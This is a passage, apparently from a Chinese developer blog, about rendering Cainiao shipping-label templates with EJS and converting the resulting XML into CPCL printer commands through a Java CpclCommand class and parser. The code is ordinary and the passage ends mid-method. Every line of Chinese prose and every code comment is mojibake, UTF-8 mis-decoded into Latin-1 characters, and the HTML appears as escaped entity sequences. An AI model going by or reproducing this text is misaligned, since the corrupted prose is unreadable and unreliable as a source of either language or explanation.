æ¨¡æ¿æˆæŒ‡ä»¤\nçŒœæµ‹å¤§æ¦‚çš„è¿‡ç¨‹å¯èƒ½æ˜¯è¿™æ ·çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éªŒè¯æ•´ä¸ªè¿‡ç¨‹æ˜¯å¦å¯è¡Œã€‚\néªŒè¯jsæ¨¡æ¿å¼•æ“\r#\ré€šè¿‡æŸ¥æ‰¾å’ŒéªŒè¯ï¼Œå‘ç°ejså¯¹ä»¥ä¸Šç‰©æµå…¬å¸çš„è“ç‰™æ¨¡æ¿æœ‰æ•ˆï¼Œå¯ä»¥æ­£ç¡®åœ°è§£ææˆxmlã€‚\næ³¨æ„ï¼š è¿™ä¸ªæ¨¡æ¿å¼•æ“ä¸æ˜¯èƒ½å…¨éƒ¨å…¼å®¹æ¨¡æ¿ï¼Œä½†æ˜¯æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚äº†ï¼ŒåŒæ—¶ç”±äºæ—¶é—´é—®é¢˜ï¼Œå°±æ²¡æœ‰ç»§ç»­éªŒè¯å…¶ä»–çš„jsæ¨¡æ¿å¼•æ“ã€‚\næ¨¡æ¿å¼•æ“æ˜¯ ejsï¼Œåœ°å€ https://ejs.bootcss.com/#install\n\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;ejs.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; // éœ€è¦è‡ªå·±æŒ‰ç…§èœé¸Ÿæ¥å£æ–‡æ¡£å¡«å…¥æ•°æ® let data = {} let config = { \u0026#34;needMiddleLogo\u0026#34;:\u0026#34;false\u0026#34;, \u0026#34;horizontalCoordinate\u0026#34;:\u0026#34;0\u0026#34;, \u0026#34;verticalCoordinate\u0026#34;:\u0026#34;0\u0026#34;, \u0026#34;needBottomLogo\u0026#34;:\u0026#34;false\u0026#34;, \u0026#34;orientation\u0026#34;:\u0026#34;normal\u0026#34;, \u0026#34;extra\u0026#34;:\u0026#34;{watermark,true}\u0026#34;, \u0026#34;needTopLogo\u0026#34;:\u0026#34;false\u0026#34; }; // éœ€è¦è‡ªå·±å¡«å…¥æ¨¡æ¿å†…å®¹ï¼Œç¤ºä¾‹æ¨¡æ¿ http://cloudprint.cainiao.com/template/standard/401 let template = \u0026#34;\u0026#34;; // å®ç°èœé¸Ÿæ¨¡æ¿ä¸­ä½¿ç”¨åˆ°çš„jså‡½æ•° context = { formatStartTime(format) { const date = new Date(); // è·å–å½“å‰æ—¶é—´ // æå–å¹´ã€æœˆã€æ—¥ã€å°æ—¶ã€åˆ†é’Ÿå’Œç§’ const year = date.getFullYear(); const month = String(date.getMonth() + 1).padStart(2, \u0026#39;0\u0026#39;); const day = String(date.getDate()).padStart(2, \u0026#39;0\u0026#39;); const hours = String(date.getHours()).padStart(2, \u0026#39;0\u0026#39;); const minutes = String(date.getMinutes()).padStart(2, \u0026#39;0\u0026#39;); const seconds = String(date.getSeconds()).padStart(2, \u0026#39;0\u0026#39;); // æ›¿æ¢æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å¯¹åº”éƒ¨åˆ† let formattedTime = format.replace(\u0026#39;yyyy\u0026#39;, year); formattedTime = formattedTime.replace(\u0026#39;MM\u0026#39;, month); formattedTime = formattedTime.replace(\u0026#39;dd\u0026#39;, day); formattedTime = formattedTime.replace(\u0026#39;HH\u0026#39;, hours); formattedTime = formattedTime.replace(\u0026#39;mm\u0026#39;, minutes); formattedTime = formattedTime.replace(\u0026#39;ss\u0026#39;, seconds); return formattedTime; }, documentCount() { return \u0026#34;1\u0026#34;; }, documentNumber() { return \u0026#34;1\u0026#34;; } }; // è§£æ html = ejs.render(template, {\u0026#34;_data\u0026#34;: data.data, \u0026#34;_config\u0026#34;:config, \u0026#34;_context\u0026#34;:context}); console.log(html) \u0026lt;/script\u0026gt; åˆ°æ­¤ï¼Œæˆ‘ä»¬çš„æ¨¡æ¿å·²ç»è§£ææˆxmläº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è§£ææˆCPCLæŒ‡ä»¤ã€‚\nxml è§£ææˆCPCLæŒ‡ä»¤\r#\ræ‰“å°æœºæ‰“å°æŒ‡ä»¤çš„å•ä½æ˜¯dotï¼Œä¸€èˆ¬8dot=1æ¯«ç±³ï¼Œæ‰€ä»¥çŒœæµ‹æ¨¡æ¿æ˜¯ä»¥æ¯«ç±³ä¸ºå•ä½çš„ï¼Œå°±æŒ‰ç…§è¿™ä¸ªå†…å®¹æ¥æä¸ªdemoï¼ŒéªŒè¯æ˜¯å¦å¯è¡Œã€‚\n\u0026lt;page xmlns=\u0026#34;http://cloudprint.cainiao.com/print\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://cloudprint.cainiao.com/print http://cloudprint-docs-resource.oss-cn-shanghai.aliyuncs.com/lpml_schema.xsd\u0026#34; xmlns:editor=\u0026#34;http://cloudprint.cainiao.com/schema/editor\u0026#34; width=\u0026#34;100\u0026#34; height=\u0026#34;180\u0026#34; splitable=\u0026#34;true\u0026#34; /\u0026gt; åŸºç¡€æŒ‡ä»¤è§£æ\r#\rpublic class CpclCommand { public final static String CHARSET = \u0026#34;GB18030\u0026#34;; /** æŒ‡ä»¤å†…å®¹ */ private Vector\u0026lt;Byte\u0026gt; command; public CpclCommand() { this.command = new Vector\u0026lt;\u0026gt;(); } /** * å¢åŠ æŒ‡ä»¤ * @param array æ•°ç»„ */ public void addCommand(byte[] array) { if(array == null) { return; } List\u0026lt;Byte\u0026gt; byteList = Bytes.asList(array); this.command.addAll(command.size(), byteList); } /** * å¢åŠ æŒ‡ä»¤ * @param index ç´¢å¼• * @param array æ•°ç»„ */ public void addCommand(int index, byte[] array) { if (array == null) { return; } List\u0026lt;Byte\u0026gt; byteList = Bytes.asList(array); this.command.addAll(index, byteList); } /** * å¢åŠ æŒ‡ä»¤ * @param bytes æŒ‡ä»¤å­—èŠ‚ */ public void addCommand(Vector\u0026lt;Byte\u0026gt; bytes) { if(CollectionUtils.isEmpty(bytes)) { return; } this.command.addAll(bytes); } /** * å¢åŠ æŒ‡ä»¤ * @param command CPCLæŒ‡ä»¤ */ public void addCommand(CpclCommand command) { if(command == null) { return; } Vector\u0026lt;Byte\u0026gt; bytes = command.getCommand(); if(!CollectionUtils.isEmpty(bytes)) { this.command.addAll(bytes); } } /** * æ·»åŠ æ–‡æœ¬æŒ‡ä»¤ * @param str æ–‡æœ¬å†…å®¹ */ private void addStrToCommand(String str) { if (StringUtil.isBlank(str)) { return; } byte[] bs = str.getBytes(Charset.forName(CHARSET)); for (int i = 0; i \u0026lt; bs.length; i++) { this.command.add(Byte.valueOf(bs[i])); } } public Vector\u0026lt;Byte\u0026gt; getCommand() { return command; } public void init(int width, int height, int copies) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;!\u0026#34;).add(\u0026#34;0\u0026#34;).add(\u0026#34;200\u0026#34;).add(\u0026#34;200\u0026#34;) // é«˜åº¦å‡å»18ä¸ªç‚¹ .add(String.valueOf(height - 18)) .add(String.valueOf(copies)); addStrToCommand(sj.toString()); // æ‰“å°å®½åº¦ String s = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;).add(\u0026#34;PAGE-WIDTH\u0026#34;).add(String.valueOf(width)).toString(); addStrToCommand(s); } public void setCn() { // è®¾ç½®ä¸­æ–‡ addStrToCommand(\u0026#34;COUNTRY CHINA\\r\\n\u0026#34;); } public void print() { addStrToCommand(\u0026#34;GAP-SENSE\\r\\n\u0026#34;); addStrToCommand(\u0026#34;FORM\\r\\n\u0026#34;); addStrToCommand(\u0026#34;PRINT\\r\\n\u0026#34;); } /** æ–‡æœ¬æŒ‡ä»¤æ–¹å‘ */ public enum TEXT { TEXT(\u0026#34;T\u0026#34;), VTEXT(\u0026#34;TV\u0026#34;), TEXT90(\u0026#34;T90\u0026#34;), TEXT180(\u0026#34;T180\u0026#34;), TEXT270(\u0026#34;T270\u0026#34;); private String name; TEXT(String name) { this.name = name; } } /** å­—ä½“å¤§å° */ public enum FONT { F0(\u0026#34;0\u0026#34;, 12, 24, 24), F1(\u0026#34;1\u0026#34;, 9, 17, 24), F2(\u0026#34;2\u0026#34;, 12, 24, 24), F3(\u0026#34;3\u0026#34;, 10, 20, 20), F4(\u0026#34;4\u0026#34;, 16, 32, 32), F5(\u0026#34;5\u0026#34;, 9, 17, 24), F6(\u0026#34;6\u0026#34;, 12 ,24, 0), F7(\u0026#34;7\u0026#34;, 12 ,24, 24), F8(\u0026#34;8\u0026#34;, 12 ,24, 24), F10(\u0026#34;10\u0026#34;, 24, 48, 48), F11(\u0026#34;11\u0026#34;, 8, 16, 24), F13(\u0026#34;13\u0026#34;, 12 ,24, 24), F20(\u0026#34;20\u0026#34;, 8, 16, 16), F24(\u0026#34;24\u0026#34;, 12 ,24, 24), F41(\u0026#34;41\u0026#34;, 8, 12, 0), F42(\u0026#34;42\u0026#34;, 12, 20, 0), F43(\u0026#34;43\u0026#34;, 16, 24, 0), F44(\u0026#34;44\u0026#34;, 24, 32, 0), F45(\u0026#34;45\u0026#34;,32,48, 0), F46(\u0026#34;46\u0026#34;,14,19, 0), F47(\u0026#34;47\u0026#34;,21,27, 0), F48(\u0026#34;48\u0026#34;,14,25, 0), F49(\u0026#34;49\u0026#34;,28,56, 0), F55(\u0026#34;55\u0026#34;,8,16, 16) ; private String value; private int width; private int cnWidth; private int height; FONT(String value, int width, int height, int cnWidth) { this.value = value; this.width = width; this.cnWidth = cnWidth; this.height = height; } public int getWidth() { return width; } public int getHeight() { return height; } public int getCnWidth() { return cnWidth; } } /** * æ–‡æœ¬æŒ‡ä»¤ {command} {font} {size} {x} {y} {data} * @param text æŒ‡ä»¤ * @param font å­—ä½“ * @param size è¯·è¾“å…¥ä»»æ„æ•°å­— * @param x æ¨ªå‘èµ·å§‹ä½ç½® * @param y çºµå‘èµ·å§‹ä½ç½® * @param data è¦æ‰“å°çš„æ–‡æœ¬ */ public void text(TEXT text, FONT font, int size, int x, int y, String data) { if (StringUtil.isBlank(data)) { data = \u0026#34; \u0026#34;; } StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(text.name).add(font.value).add(String.valueOf(size)). add(String.valueOf(x)).add(String.valueOf(y)).add(data); this.addStrToCommand(sj.toString()); } public void addSimulateBlock(TEXT text, FONT font, int size, int x, int y, String data, int width, int xScal, int yScal, int gap, boolean isCenter) { // åªæ”¯æŒæ­£æ–¹å‘ if (StringUtil.isNotBlank(data)) { xScal = xScal \u0026lt;= 0 ? 1 : xScal; int index = getStrIndex(data, width, font, xScal); if (index \u0026lt;= 0) { return; } // æ¢è¡Œ int i = data.indexOf(\u0026#34;\\n\u0026#34;); if (i \u0026gt; -1 \u0026amp;\u0026amp; index \u0026gt; i) { index = i; data = data.replaceFirst(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;); } String printSubData = data.substring(0, index).replaceFirst(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;); if (isCenter) { int strLen = getStrLen(printSubData, font, xScal); int posX = x + (width - strLen) / 2; text(text, font, size, posX, y, printSubData); } else { text(text, font, size, x, y, printSubData); } if (index \u0026lt; data.length()) { int nextY = 0; if (gap == 0) { nextY = y + font.getHeight() * yScal * 3 / 2; } else { nextY = y + font.getHeight() * yScal + gap; } String nextText = data.substring(index); addSimulateBlock(text, font, size, x, nextY, nextText, width,xScal, yScal, gap, isCenter); } } } public int calcSimulateBlockNextY(TEXT text, FONT font, int size, int x, int y, String data, int width, int xScal, int yScal, int gap) { // åªæ”¯æŒæ­£æ–¹å‘ if (StringUtil.isNotBlank(data)) { xScal = xScal \u0026lt;= 0 ? 1 : xScal; int index = getStrIndex(data, width, font, xScal); if (index \u0026lt;= 0) { return y; } // æ¢è¡Œ int i = data.indexOf(\u0026#34;\\n\u0026#34;); if (i \u0026gt; -1 \u0026amp;\u0026amp; index \u0026gt; i) { index = i; data = data.replaceFirst(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;); } if (index \u0026lt; data.length()) { int nextY = 0; if (gap == 0) { nextY = y + font.getHeight() * yScal * 3 / 2; } else { nextY = y + font.getHeight() * yScal + gap; } String nextText = data.substring(index); return calcSimulateBlockNextY(text, font, size, x, nextY, nextText, width,xScal, yScal, gap); } return y; } return y; } /** * è·å–å­—ä½“å®½åº¦ï¼Œæ•°å­—å’Œä¸­æ–‡å®½åº¦ä¸ä¸€æ · * @param str å­—ç¬¦ä¸² * @param width å¯æ‰“å°å®½åº¦ * @param font å­—ä½“å®½åº¦ * @param xScal æ”¾å¤§å®½åº¦ * @return å¯æ‰“å°å­—ç¬¦ä¸²é•¿åº¦ç´¢å¼• */ private int getStrIndex(String str, int width, FONT font, int xScal) { char[] chars = str.toCharArray(); int curWidth = 0; for (int i = 0; i \u0026lt; chars.length; i++) { if ((chars[i] + \u0026#34;\u0026#34;).getBytes().length == 1) { curWidth += font.getWidth() * xScal; } else { curWidth += font.getCnWidth() * xScal; } if (width \u0026lt; curWidth) { return i; } } return chars.length; } private int getStrLen(String str, FONT font, int xScal) { char[] chars = str.toCharArray(); int curWidth = 0; for (int i = 0; i \u0026lt; chars.length; i++) { if ((chars[i] + \u0026#34;\u0026#34;).getBytes().length == 1) { curWidth += font.getWidth() * xScal; } else { curWidth += font.getCnWidth() * xScal; } } return curWidth; } /** * å‘½ä»¤å¯å°†å¸¸é©»å­—ä½“æ”¾å¤§æŒ‡å®šçš„æ”¾å¤§å€æ•°,ä½¿ç”¨äºTEXTå‘½ä»¤çš„ä¸Šä¸€è¡Œ * @param width å®½åº¦æ”¾å¤§å€æ•°ï¼Œæœ‰æ•ˆæ”¾å¤§å€æ•°ä¸º 1 åˆ° 16 * @param height é«˜åº¦æ”¾å¤§å€æ•°ï¼Œæœ‰æ•ˆæ”¾å¤§å€æ•°ä¸º 1 åˆ° 16 */ public void setMag(int width, int height) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;SETMAG\u0026#34;).add(String.valueOf(width)).add(String.valueOf(height)); this.addStrToCommand(sj.toString()); } /** * å‘½ä»¤å¯å°†å¸¸é©»å­—ä½“åŠ ç²— * @param bold æ˜¯å¦åŠ ç²— */ public void setBlod(boolean bold) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;SETBLOD\u0026#34;).add(bold ? \u0026#34;1\u0026#34; : \u0026#34;0\u0026#34;); this.addStrToCommand(sj.toString()); } /** * æ¡ç ç±»å‹ * BARCODEï¼ˆæˆ– Bï¼‰ æ¨ªå‘æ‰“å°æ¡ç  * VBARCODEï¼ˆæˆ– VBï¼‰ çºµå‘æ‰“å°æ¡ç  */ public enum BARCODE { BARCODE(\u0026#34;B\u0026#34;), VBARCODE(\u0026#34;VB\u0026#34;); private String command; BARCODE(String command) { this.command = command; } } /** * æ¡ç ç±»å‹ */ public enum CODE_TYPE { UPC_A(\u0026#34;UPCA\u0026#34;), UPC_E(\u0026#34;UPCE\u0026#34;),EAN13(\u0026#34;EAN13\u0026#34;),EAN8(\u0026#34;EAN8\u0026#34;), CODE39(\u0026#34;39\u0026#34;),CODE93(\u0026#34;93\u0026#34;), CODE128(\u0026#34;128\u0026#34;),CODABAR(\u0026#34;CODABAR\u0026#34;); private String type; CODE_TYPE(String type) { this.type = type; } } /** * æ¡ç å®½é«˜æ¯”ä¾‹ */ public enum RATIO { R0(\u0026#34;0\u0026#34;, 1.5F), R1(\u0026#34;1\u0026#34;, 2), R2(\u0026#34;2\u0026#34;, 2.5F), R3(\u0026#34;3\u0026#34;, 3), R4(\u0026#34;4\u0026#34;, 3.5F), R20(\u0026#34;20\u0026#34;, 20), R21(\u0026#34;21\u0026#34;, 21), R22(\u0026#34;22\u0026#34;, 22), R23(\u0026#34;23\u0026#34;, 23), R24(\u0026#34;24\u0026#34;, 24), R25(\u0026#34;25\u0026#34;, 25), R26(\u0026#34;26\u0026#34;, 26), R27(\u0026#34;27\u0026#34;, 27), R28(\u0026#34;28\u0026#34;, 28), R29(\u0026#34;29\u0026#34;, 29), R30(\u0026#34;30\u0026#34;, 30); private String key; private float value; RATIO(String key, float value) { this.key = key; this.value = value; } public float getValue() { return value; } } public enum EEC { LEVEL_L(\u0026#34;L\u0026#34;), LEVEL_M(\u0026#34;M\u0026#34;), LEVEL_Q(\u0026#34;Q\u0026#34;), LEVEL_H(\u0026#34;H\u0026#34;); private final String value; EEC(String value) { this.value = value; } public String getValue() { return this.value; } } /** * æ¡ç  * @param barcode æ¡ç æŒ‡ä»¤ * @param codeType æ¡ç ç±»å‹ * @param width æ¡ç å®½åº¦ * @param ratio å®½é«˜æ¯”ä¾‹ * @param height æ¡ç é«˜åº¦ * @param x æ¡ç Xæ–¹å‘ * @param y æ¡ç Yæ–¹å‘ * @param data æ¡ç æ•°æ® */ public void barcode(BARCODE barcode, CODE_TYPE codeType, int width, RATIO ratio, int height, int x, int y, String data) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(barcode.command).add(codeType.type).add(String.valueOf(width)).add(ratio.key).add(String.valueOf(height)) .add(String.valueOf(x)).add(String.valueOf(y)).add(data); this.addStrToCommand(sj.toString()); } /** * æ¡ç åº•éƒ¨æ–‡æœ¬ * @param font å­—ä½“ * @param size å¤§å° * @param offset æ–‡æœ¬è·ç¦»æ¡ç çš„å•ä½åç§»é‡ */ public void barcodeText(FONT font, int size, int offset) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;BT\u0026#34;).add(font.value).add(String.valueOf(size)).add(String.valueOf(offset)); this.addStrToCommand(sj.toString()); } /** * å…³é—­æ¡ç åº•éƒ¨æ–‡æœ¬ */ public void barcodeTextOff() { this.addStrToCommand(\u0026#34;BT OFF\\r\\n\u0026#34;); } /** * äºŒç»´ç  * @param barcode æ¡ç æŒ‡ä»¤æ–¹å‘ * @param x x * @param y y * @param mm QR Code è§„èŒƒç¼–å·,1 æˆ– 2ï¼Œæ¨èä¸º 2 * @param un æ¨¡å—çš„å•ä½å®½åº¦/å•ä½é«˜åº¦ 1-32ï¼Œé»˜è®¤ä¸º 6 * @param eec çº é”™ç­‰çº§ H - æé«˜å¯é æ€§çº§åˆ«ï¼ˆH çº§ï¼‰ Q - é«˜å¯é æ€§çº§åˆ«ï¼ˆQ çº§ï¼‰ M - æ ‡å‡†çº§åˆ«ï¼ˆM çº§ï¼‰ L - é«˜å¯†åº¦çº§åˆ«ï¼ˆL çº§ï¼‰ * @param data æ‰“å°æ•°æ® */ public void qrCode(BARCODE barcode, int x, int y, int mm, int un, EEC eec, String data) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(barcode.command).add(\u0026#34;QR\u0026#34;).add(String.valueOf(x)).add(String.valueOf(y)) .add(\u0026#34;M\u0026#34;).add(String.valueOf(mm)).add(\u0026#34;U\u0026#34;).add(String.valueOf(un)); addStrToCommand(sj.toString()); // äºŒç»´ç æ•°æ® addStrToCommand(eec.value + \u0026#34;A,\u0026#34; + data + \u0026#34;\\r\\n\u0026#34;); // ç»“æŸäºŒç»´ç  addStrToCommand(\u0026#34;ENDQR\\r\\n\u0026#34;); } /** * ç”¨æˆ·å¯ä»¥ä½¿ç”¨ BOX å‘½ä»¤ç”Ÿæˆå…·æœ‰æŒ‡å®šçº¿æ¡å®½åº¦çš„çŸ©å½¢ã€‚ * @param x0 å·¦ä¸Šè§’çš„ X åæ ‡ * @param y0 å·¦ä¸Šè§’çš„ Y åæ ‡ * @param x1 å³ä¸‹è§’çš„ X åæ ‡ * @param y1 å³ä¸‹è§’çš„ Y åæ ‡ * @param width å½¢æˆçŸ©å½¢æ¡†çš„çº¿æ¡çš„å•ä½å®½åº¦ 1 */ public void box(float x0, float y0, float x1, float y1, float width) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;BOX\u0026#34;).add(String.valueOf(x0)).add(String.valueOf(y0)). add(String.valueOf(x1)).add(String.valueOf(y1)).add(String.valueOf(width)); addStrToCommand(sj.toString()); } /** * ä½¿ç”¨ LINE å‘½ä»¤å¯ä»¥ç»˜åˆ¶ä»»ä½•é•¿åº¦ã€å®½åº¦å’Œè§’åº¦æ–¹å‘çš„çº¿æ¡ã€‚ * @param x0 å·¦ä¸Šè§’çš„ X åæ ‡ * @param y0 å·¦ä¸Šè§’çš„ Y åæ ‡ * @param x1 å³ä¸‹è§’çš„ X åæ ‡ * @param y1 å³ä¸‹è§’çš„ Y åæ ‡ * @param width å½¢æˆçŸ©å½¢æ¡†çš„çº¿æ¡çš„å•ä½å®½åº¦ 1 */ public void line(int x0, int y0, int x1, int y1, int width) { StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;L\u0026#34;).add(String.valueOf(x0)).add(String.valueOf(y0)). add(String.valueOf(x1)).add(String.valueOf(y1)).add(String.valueOf(width)); addStrToCommand(sj.toString()); } /** * ç”Ÿæˆå›¾ç‰‡ * @param x0 x * @param y0 y * @param width å›¾ç‰‡å®½åº¦ * @param height å›¾ç‰‡é«˜åº¦ * @param bmp bmp æ•°æ® */ public void graphics(int x0, int y0, int width, int height, BufferedImage bmp) { if (bmp != null) { //ç”Ÿæˆ2è¿›åˆ¶å­—ç¬¦ä¸² int[] rgb = new int[3]; width = bmp.getWidth(); height = bmp.getHeight(); int wModByte = (width % 8) == 0 ? 0 : 8 - (width % 8); int pixelCount = (width + wModByte) * height; int wPrintByte = (width + wModByte) / 8; StringBuilder res = new StringBuilder(); for (int y = 0; y \u0026lt; height; y++) { for (int x = 0; x \u0026lt; width; x++) { int pixel = bmp.getRGB(x, y); // ä¸‹é¢ä¸‰è¡Œä»£ç å°†ä¸€ä¸ªæ•°å­—è½¬æ¢ä¸ºRGBæ•°å­— rgb[0] = (pixel \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16; rgb[1] = (pixel \u0026amp; 0xff00) \u0026gt;\u0026gt; 8; rgb[2] = (pixel \u0026amp; 0xff); String bitStr = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;1\u0026#34; : \u0026#34;0\u0026#34;; res.append(bitStr); } for (int k = 0; k \u0026lt; wModByte; k++) { res.append(\u0026#34;1\u0026#34;); } } //ç”ŸæˆäºŒå€¼å›¾å­—èŠ‚æµ String binary2 = res.toString(); StringBuilder hexStr = new StringBuilder(); for (int i = 0; i \u0026lt; binary2.length(); i = i + 8) { String substring = binary2.substring(i, i + 8); String hex = Long.toHexString(Long.parseLong(substring,2)); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } hexStr.append(hex); } StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;EG\u0026#34;).add(String.valueOf(wPrintByte)).add(String.valueOf(height)) .add(String.valueOf(x0)).add(String.valueOf(y0)).add(hexStr.toString()); addStrToCommand(sj.toString()); } } private String toHexString(byte[] bytes) { StringBuilder sb = new StringBuilder(); for(Byte b : bytes) { String hex = Integer.toHexString(b.intValue()).toUpperCase(); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } sb.append(hex); } return sb.toString(); } } æ¨¡æ¿è§£æå¤„ç†\r#\ræ ‡ç­¾\npublic enum TAG { LAYOUT(\u0026#34;layout\u0026#34;), HEADER(\u0026#34;header\u0026#34;), FOOTER(\u0026#34;footer\u0026#34;), TEXT(\u0026#34;text\u0026#34;), IMAGE(\u0026#34;image\u0026#34;), BARCODE(\u0026#34;barcode\u0026#34;), LINE(\u0026#34;line\u0026#34;), BOX(\u0026#34;box\u0026#34;); private final String value; TAG(String value) { this.value = value; } public String getValue() { return this.value; } } å±æ€§\npublic enum ATTR { COMMAND(\u0026#34;command\u0026#34;), SRC(\u0026#34;src\u0026#34;), FONT_SIZE(\u0026#34;fontSize\u0026#34;), FONT_WEIGHT(\u0026#34;fontWeight\u0026#34;), WIDTH(\u0026#34;width\u0026#34;), HEIGHT(\u0026#34;height\u0026#34;), TYPE(\u0026#34;type\u0026#34;), /** å®šä¹‰ä¸¤å¼ å·æ ‡çº¸é—´çš„å‚ç›´é—´è·è·ç¦» */ GAP(\u0026#34;gap\u0026#34;), /** BARCODE: 0 è¡¨ç¤ºäººçœ¼ä¸å¯è¯†ï¼Œ1 è¡¨ç¤ºäººçœ¼å¯è¯† */ /** BARCODE: ä¸€ç»´æ¡ç ç§ç±» */ CODE_TYPE(\u0026#34;codeType\u0026#34;), /** BOX: æ–¹æ¡†å·¦ä¸Šè§’ X åæ ‡ï¼Œå•ä½ dot */ START_X(\u0026#34;startX\u0026#34;), /** BOX: æ–¹æ¡†å·¦ä¸Šè§’ Y åæ ‡ï¼Œå•ä½ dot */ START_Y(\u0026#34;startY\u0026#34;), /** BOX: æ–¹æ¡†å³ä¸‹è§’ X åæ ‡ï¼Œå•ä½ dot */ END_X(\u0026#34;endX\u0026#34;), /** BOX: æ–¹æ¡†å³ä¸‹è§’ Y åæ ‡ï¼Œå•ä½ dot */ END_Y(\u0026#34;endY\u0026#34;), /** BOX: æ–¹æ¡†çº¿å®½ï¼Œå•ä½ dot */ /** TEXT: å­—ä½“åç§° */ FONT(\u0026#34;font\u0026#34;), /** TEXT: X æ–¹å‘æ”¾å¤§å€ç‡ 1-10*/ X_MULTIPLICATION(\u0026#34;xMultiplication\u0026#34;), /** TEXT: Y æ–¹å‘æ”¾å¤§å€ç‡ 1-10*/ Y_MULTIPLICATION(\u0026#34;yMultiplication\u0026#34;), /** æ‰“å°ä»½æ•° */ COPIES(\u0026#34;copies\u0026#34;), LEFT(\u0026#34;left\u0026#34;), TOP(\u0026#34;top\u0026#34;), VALUE(\u0026#34;value\u0026#34;), ; private final String value; ATTR(String value) { this.value = value; } public String getValue() { return this.value; } } æ‰“å°æŒ‡ä»¤ç±»å‹\npublic abstract class Printer\u0026lt;T\u0026gt; { /** è§£ææ¨¡æ¿ */ public abstract byte[] wrapTemplate(Element element); public abstract T printText(Element element); /** æ‰“å°æ¡å½¢ç  */ public abstract T printBarcode(Element element); /** æ‰“å°å›¾ç‰‡ */ public abstract T printImage(Element element); /** æ‰“å°çº¿æ¡ */ public abstract T printLine(Element element); } public class CpclPrinter extends Printer\u0026lt;CpclCommand\u0026gt; { private final static Logger logger = LoggerFactory.getLogger(CpclPrinter.class); @Override public byte[] wrapTemplate(Element element) { if(element == null) { return null; } CpclCommand cpclCommand = new CpclCommand(); // æŒ‡ä»¤é¢„å¤„ç† this.preHandle(cpclCommand, element); int totalHeight = getIntValue(element.attributeValue(ATTR.HEIGHT.getValue()), 0); handlerNode(element, cpclCommand, totalHeight); // æ¨¡ç‰ˆè§£æåæŒ‡ä»¤å¤„ç† this.afterHandle(cpclCommand); Vector\u0026lt;Byte\u0026gt; command = cpclCommand.getCommand(); return ArrayUtils.toPrimitive(command.toArray(new Byte[command.size()])); } private void handlerNode(Element element, CpclCommand cpclCommand, int totalHeight) { TAG parentElemEnum = EnumUtils.getEnum(TAG.class, element.getName().toUpperCase()); Iterator iterator = element.elementIterator(); while (iterator.hasNext()) { Element elem = (Element) iterator.next(); String elemName = elem.getName(); TAG elemEnum = EnumUtils.getEnum(TAG.class, elemName.toUpperCase()); if ((TAG.HEADER.equals(parentElemEnum) || TAG.FOOTER.equals(parentElemEnum)) \u0026amp;\u0026amp; TAG.LAYOUT.equals(elemEnum)) { // æŠŠé«˜åº¦æ·»åŠ ä¸‹ä¸‹é¢layoutä¸­ int parentHeight = getIntValue(element.attributeValue(ATTR.HEIGHT.getValue()), 0); elem.addAttribute(\u0026#34;top\u0026#34;, String.valueOf((totalHeight - parentHeight) / 8)); } if (TAG.LAYOUT.equals(parentElemEnum) \u0026amp;\u0026amp; TAG.LAYOUT.equals(elemEnum)) { // æŠŠé«˜åº¦æ·»åŠ ä¸‹ä¸‹é¢layoutä¸­ int parentHeight = getIntValue(element.attributeValue(ATTR.HEIGHT.getValue()), 0); int parentTop = getIntValue(element.attributeValue(ATTR.TOP.getValue()), 0); int height = getIntValue(elem.attributeValue(ATTR.HEIGHT.getValue()), 0); int top = getIntValue(elem.attributeValue(ATTR.TOP.getValue()), 0); elem.addAttribute(\u0026#34;height\u0026#34;, String.valueOf((parentHeight + height) / 8)); elem.addAttribute(\u0026#34;top\u0026#34;, String.valueOf((parentTop + top) / 8)); } if (TAG.HEADER.equals(elemEnum) || TAG.FOOTER.equals(elemEnum) || TAG.LAYOUT.equals(elemEnum)) { handlerNode(elem, cpclCommand, totalHeight); } else { handlerTag(cpclCommand, elem); } } } private void handlerTag(CpclCommand cpclCommand, Element elem) { String elemName = elem.getName(); TAG elemEnum = 